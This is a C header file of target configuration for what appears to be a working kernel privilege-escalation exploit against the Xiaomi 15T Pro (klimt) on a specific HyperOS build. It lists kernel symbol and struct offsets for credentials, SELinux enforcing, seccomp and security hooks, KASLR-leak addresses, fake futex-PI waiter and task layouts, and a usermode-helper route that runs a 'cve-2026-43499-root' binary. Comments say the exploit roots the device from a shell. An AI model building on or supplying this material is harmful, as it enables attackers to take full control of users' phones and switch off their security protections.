#ifndef TARGET_H
#define TARGET_H

/* Xiaomi 15T Pro (klimt) — HyperOS OS3.0.301.0.WOSJPXM (JP), MT6989 / Dimensity 9400+
 *
 *   kernel 6.6.89-android15-8-g0889fe95bb10-ab14402178-4k  (GKI, 4K pages)
 *   build  Xiaomi/klimt/klimt:16/BP2A.250605.031.A3/...:user/release-keys
 *
 * Build with:
 *   make TARGET=klimt/jp/6.6.89-android15-8-g0889fe95bb10-ab14402178-4k
 *
 * All offsets derived from vmlinux via IDA Pro MCP (2026-07-31).
 * vmlinux SHA256: 14c19e6ae18d0ce7db695e336292ae2c19a67902739d5cc8a2b78b10914010c8
 *
 * The futex-PI bug is present in this build (6.6.89 < 6.6.140).
 */

#define BUILD_VARIANT_LABEL "klimt_BP2A.250605.031.A3_os3.0.301.0"
#define BUILD_FINGERPRINT "Xiaomi/klimt/klimt:16/BP2A.250605.031.A3/OS3.0.301.0.WOSJPXM:user/release-keys"
#define TARGET_LAYOUT_ID "klimt-6.6"

/* ---------------------------------------------------------------- memory --- */
#define KIMAGE_TEXT_BASE 0xffffffc080000000ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#define P0_PHYS_OFFSET 0x80000000ULL

#ifndef P0_KERNEL_PHYS_LOAD
#define P0_KERNEL_PHYS_LOAD 0x80000000ULL
#endif

#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END   0xffffff9000000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffff9000000000ULL
#define VMEMMAP_START 0xfffffffe00000000ULL

/* ------------------------------------------- KernelSnitch geometry --------- */
#define MM_STRUCT_SZ 0x500
#define MM_ORDER 3
#define FUTEX_HASHSIZE 2048
#define KS_MTE_TAGGED 0
#define KERNELSNITCH_THRESHOLD_MULT 10

/* ------------------------------------------- global symbols (IDA MCP) ------ */
#define INIT_TASK_OFF          0x020fe280ULL
#define INIT_CRED_OFF          0x02110548ULL
#define INIT_UTS_NS_OFF        0x02282190ULL
#define EMPTY_ZERO_PAGE_OFF    0x022ed000ULL
#define ROOT_TASK_GROUP_OFF    0x022f5580ULL
#define SELINUX_ENFORCING_OFF  0x02336ea0ULL
#define KPTR_RESTRICT_OFF      0x020fbd20ULL
#define CAP_CAPABLE_ACTIVE_OFF 0ULL
#define KPTR_RESTRICT          (KIMAGE_TEXT_BASE + KPTR_RESTRICT_OFF)
#define SELINUX_BLOB_SIZES_OFF 0x016625f0ULL
#define SECURITY_HOOK_HEADS_OFF 0x01661eb8ULL
#define KMALLOC_CACHES_OFF     0x016619f8ULL
#define ANON_PIPE_BUF_OPS_OFF  0x0115ba08ULL
#define CONFIGFS_READ_ITER_OFF      0x0048bd58ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x0048c284ULL
#define COPY_SPLICE_READ_OFF   0x00410578ULL
#define NOOP_LLSEEK_OFF        0x003c3318ULL
#define ASHMEM_MISC_FOPS_OFF   0x0225b3e8ULL
#define ASHMEM_FOPS_OFF        0x012dbe18ULL
#define ASHMEM_IOCTL_OFF       0x00c7f65cULL
#define ASHMEM_COMPAT_IOCTL_OFF 0x00c7fd18ULL
#define ASHMEM_MMAP_OFF        0x00c7fd6cULL
#define ASHMEM_OPEN_OFF        0x00c7ff8cULL
#define ASHMEM_RELEASE_OFF     0x00c80014ULL
#define ASHMEM_SHOW_FDINFO_OFF 0x00c800a0ULL

/* KASLR leak */
#define SLIDE_NFULNL_LOGGER_OFF       0x020f2258ULL
#define SLIDE_LOGGERS_0_1_OFF         0x020f21a0ULL
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x022187c8ULL
#define SLIDE_SYSCTL_BOOTID_OFF       0x02357e98ULL

/* Derived macros */
#define INIT_TASK           (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define INIT_CRED           (KIMAGE_TEXT_BASE + INIT_CRED_OFF)
#define INIT_UTS_NS         (KIMAGE_TEXT_BASE + INIT_UTS_NS_OFF)
#define EMPTY_ZERO_PAGE     (KIMAGE_TEXT_BASE + EMPTY_ZERO_PAGE_OFF)
#define ROOT_TASK_GROUP     (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_ENFORCING   (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define SELINUX_BLOB_SIZES  (KIMAGE_TEXT_BASE + SELINUX_BLOB_SIZES_OFF)
#define SECURITY_HOOK_HEADS (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)
#define KMALLOC_CACHES      (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS   (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
#define ASHMEM_MISC_FOPS    (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS         (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL        (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP         (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN         (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE      (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO  (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER      (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ    (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK         (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define SLIDE_NFULNL_LOGGER_IMAGE       (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
#define SLIDE_LOGGERS_0_1_IMAGE         (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
#define SLIDE_INIT_TASK_IMAGE           (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE     (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE       (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

/* ---------------------------------------------------- pselect overlay ------
 * klimt uses SIMPLE_LAYOUT (matching the standalone exploit/ klimt-BP2A target
 * that roots this device from a shell): in[0]=fake_w0, ex[0]=task, ex[1]=lock,
 * ex[2]=wake_state=3. The standalone build reaches ret=9 with this layout,
 * so it is the verified one for this kernel's stack frame.
 *
 * The shift layout (waiter_word 2-14 + PSELECT_WAITER_WORD_SHIFT) was inherited
 * from pmg110/dali and produced ret=8 on klimt — a one-word layout mismatch
 * that skipped CFI and looped. PSELECT_WAITER_WORD_SHIFT is kept for builds
 * that still reference it but is not used while PSELECT_USE_SIMPLE_LAYOUT=1.
 *
 * SLIDE_PSELECT_WORD_SHIFT=0 inherited from pmg110; needs verification
 * if the slide route is used through this target header.
 */
#define PSELECT_USE_SIMPLE_LAYOUT 1
#define PSELECT_WAITER_WORD_SHIFT -2
#define SLIDE_PSELECT_WORD_SHIFT 0
#define SLIDE_PSELECT_NFDS 320
#define SLIDE_USE_SELECT 1

/* ------------------------------------------- struct fields (GKI 6.6) -------
 * Same GKI 6.6 struct layouts as pmg110. Confirmed: TASK_COMM_OFF=0x830
 * ('swapper' at init_task+0x830).
 */
#define WAITER_LOCAL_OFF          0x80
#define WAITER_TREE_ENTRY_OFF     0x00
#define WAITER_PI_TREE_ENTRY_OFF  0x28
#define WAITER_TASK_OFF           0x50
#define WAITER_LOCK_OFF           0x58
#define WAITER_WAKE_STATE_OFF     0x60
#define WAITER_PRIO_OFF           0x18
#define WAITER_DEADLINE_OFF       0x20
#define WAITER_WW_CTX_OFF         0x68

#define FAKE_WAITER_TREE_PRIO_OFF         0x18
#define FAKE_WAITER_TREE_DEADLINE_OFF     0x20
#define FAKE_WAITER_PI_TREE_ENTRY_OFF     0x28
#define FAKE_WAITER_PI_TREE_PRIO_OFF      0x40
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF  0x48
#define FAKE_WAITER_TASK_OFF              0x50
#define FAKE_WAITER_LOCK_OFF              0x58
#define FAKE_WAITER_WAKE_STATE_OFF        0x60
#define FAKE_WAITER_WW_CTX_OFF            0x68

#define FAKE_TASK_USAGE_OFF          0x40
#define FAKE_TASK_PRIO_OFF           0x84
#define FAKE_TASK_NORMAL_PRIO_OFF    0x8c
#define FAKE_TASK_TASK_GROUP_OFF     0x348
#define FAKE_TASK_PI_LOCK_OFF        0x90c
#define FAKE_TASK_PI_WAITERS_OFF     0x920
#define FAKE_TASK_PI_TOP_TASK_OFF    0x930
#define FAKE_TASK_PI_BLOCKED_ON_OFF  0x938

#define MM_OWNER_OFF             1032
#define TASK_PID_OFF             0x618
#define TASK_TGID_OFF            0x61c
#define TASK_REAL_PARENT_OFF     0x628
#define TASK_ATOMIC_FLAGS_OFF    0x5d8
#define TASK_REAL_CRED_OFF       0x818
#define TASK_CRED_OFF            0x820
#define TASK_COMM_OFF            0x830
#define TASK_TASKS_OFF           0x550
#define TASK_THREAD_INFO_FLAGS_OFF 0x00
#define TASK_SECCOMP_OFF         0x8e8

#define CRED_UID_OFF         8
#define CRED_SECUREBITS_OFF  40
#define CRED_CAPS_OFF        48
#define CRED_SECURITY_OFF    128
#define SELINUX_CRED_BLOB_OFF  0
#define SELINUX_CRED_OSID_OFF  0
#define SELINUX_CRED_SID_OFF   4
#define SECCOMP_MODE_OFF          0x00
#define SECCOMP_FILTER_COUNT_OFF  0x04
#define SECCOMP_FILTER_OFF        0x08
#define TIF_SECCOMP_BIT           11
#define PFA_NO_NEW_PRIVS_BIT      0

#define STRUCT_PAGE_SIZE              0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF         0x08
#define STRUCT_PAGE_TYPE_OFF          0x30

#define PIPE_BUFFER_SIZE         0x28
#define PIPE_BUFFER_SLOTS        32
#define PIPE_BUF_FLAG_CAN_MERGE  0x10
#define PIPE_INODE_INFO_STRUCT_SIZE   0xb8
#define PIPE_INODE_INFO_SIZE          0xc0
#define PIPE_INODE_INFO_SLOTS_PER_PAGE 21
#define PIPE_HEAD_OFF                 0x60
#define PIPE_TAIL_OFF                 0x64
#define PIPE_MAX_USAGE_OFF            0x68
#define PIPE_RING_SIZE_OFF            0x6c
#define PIPE_NR_ACCOUNTED_OFF         0x70
#define PIPE_READERS_OFF              0x74
#define PIPE_WRITERS_OFF              0x78
#define PIPE_FILES_OFF                0x7c
#define PIPE_TMP_PAGE_OFF             0x90
#define PIPE_BUFS_OFF                 0xa8
#define PIPE_USER_OFF                 0xb0

#define FOPS_OWNER_OFF        0x00
#define FOPS_LLSEEK_OFF       0x08
#define FOPS_READ_OFF         0x10
#define FOPS_WRITE_OFF        0x18
#define FOPS_READ_ITER_OFF    0x20
#define FOPS_WRITE_ITER_OFF   0x28
#define FOPS_IOCTL_OFF        0x48
#define FOPS_COMPAT_IOCTL_OFF 0x50
#define FOPS_MMAP_OFF         0x58
#define FOPS_OPEN_OFF         0x68
#define FOPS_RELEASE_OFF      0x78
#define FOPS_SPLICE_READ_OFF  0xb8
#define FOPS_SHOW_FDINFO_OFF  0xd8

#define LOCK_OFF      0x0E80
#define W0_OFF        0x1180
#define FOPS_OFF      0x0F80
#define SCRATCH_OFF   0x1200
#define RIGHT_OFF     0x1240
#define LEFT_OFF      0x1260
#define FAKE_TASK_OFF 0x1280
#define CFG_PAGE_OFF            16
#define CFG_NEEDS_READ_FILL_OFF 80
#define CFG_BIN_BUFFER_OFF      88
#define CFG_BIN_BUFFER_SIZE_OFF 96
#define CFG_CB_MAX_SIZE_OFF     100

#define CRED_COPY_OFF 0x1080

#define ROOT_HELPER_PATH "/data/local/tmp/cve-2026-43499-root"

#define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000cfa4cULL
#define SYSTEM_UNBOUND_WQ_OFF 0x020eae60ULL
#define CALL_USERMODEHELPER_EXEC_WORK \
  (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)
#define SYSTEM_UNBOUND_WQ (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)
#define ROOT_UMH_WORK_OFF 0x6000
#define ROOT_UMH_DATA_OFF 0x6200
#define WQ_DFL_PWQ_OFF 0xb0
#define PWQ_POOL_OFF 0x00
#define PWQ_WQ_OFF 0x08
#define PWQ_WORK_COLOR_OFF 0x10
#define PWQ_REFCNT_OFF 0x18
#define PWQ_NR_IN_FLIGHT_OFF 0x1c
#define PWQ_NR_ACTIVE_OFF 0x5c
#define PWQ_MAX_ACTIVE_OFF 0x60
#define POOL_WORKLIST_OFF 0x28
#define POOL_NR_IDLE_OFF 0x3c
#define WORK_DATA_OFF 0x00
#define WORK_ENTRY_OFF 0x08
#define WORK_FUNC_OFF 0x18

#endif
